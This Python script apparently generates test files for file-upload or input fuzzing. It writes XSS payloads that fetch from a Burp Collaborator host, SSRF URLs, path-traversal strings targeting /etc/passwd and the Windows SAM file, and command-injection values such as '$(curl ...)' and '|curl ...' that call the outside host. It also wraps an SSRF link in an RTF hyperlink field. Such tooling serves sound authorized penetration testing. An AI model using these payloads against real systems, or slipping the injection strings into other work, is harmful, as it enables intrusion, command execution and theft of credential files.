from pathlib import Path

def generate_text_payloads(output_dir, ext, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'xss': [
            f"<script>fetch('http://{burp_collab}/xss1')</script>",
            f"<img src=x onerror=fetch('http://{burp_collab}/xss2')>",
        ],
        'ssrf': [
            f"http://{burp_collab}/ssrf1",
            f"https://{burp_collab}/ssrf2",
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
        ],
        'rce': [
            f"|curl http://{burp_collab}/rce1",
            f";curl http://{burp_collab}/rce2",
            f"`curl http://{burp_collab}/rce3`",
            f"$(curl http://{burp_collab}/rce4)",
        ],
    }
    
    if output_dir.name in ['txt', 'csv', 'rtf']:
        ext = output_dir.name
        for vuln, payloads in vulns.items():
            vuln_dir = output_dir / vuln
            vuln_dir.mkdir(exist_ok=True)
            
            for i, payload in enumerate(payloads, 1):
                if ext == 'rtf' and vuln == 'ssrf':
                    rtf_content = f'''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "{payload}"}}{{\\fldrslt Click here}}
}}'''
                    output_file = vuln_dir / f"payload_{i}.rtf"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(rtf_content)
                else:
                    output_file = vuln_dir / f"payload_{i}.{ext}"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(payload)

